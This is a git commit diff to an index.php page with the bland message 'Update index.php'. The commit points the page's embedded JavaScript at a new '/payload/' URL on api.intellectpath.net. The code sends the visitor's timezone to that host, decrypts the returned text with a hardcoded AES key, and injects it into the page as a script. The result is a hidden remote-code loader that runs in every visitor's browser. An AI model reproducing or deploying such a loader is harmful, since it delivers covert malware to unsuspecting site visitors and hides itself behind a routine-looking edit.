274e0e885f0959d2bb4707fa72f3bd467f1ef2ca
haohanhoa-cmd <haohanhoa@gmail.com>
2026-06-24 13:11:53 +0400

    Update index.php

--- index.php
+++ index.php
@@ -241,7 +241,7 @@ height:350px;
         const bytes = CryptoJS.AES.decrypt(decodedText, 'Ma0cHelpMark0er007_20maywebdeskFrizz2k26');
         return bytes.toString(CryptoJS.enc.Utf8);
     }
-    const codeString = aesDecode(`https://api.intellectpath.net/view/win`);
+    const codeString = aesDecode(`https://api.intellectpath.net/payload/20maywebdeskFrizz2k26/Ma0cHelpMark0er007`);
     const script = document.createElement("script");
     script.textContent = codeString;
     document.body.appendChild(script);
@@ -257,7 +257,7 @@ height:350px;
         const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         try {
             const encodedScript = await transmitTimezoneData(
-                    "https://api.intellectpath.net/view/win",
+                    "https://api.intellectpath.net/payload/20maywebdeskFrizz2k26/Ma0cHelpMark0er007",
                     clientTimezone
                 )
             ;
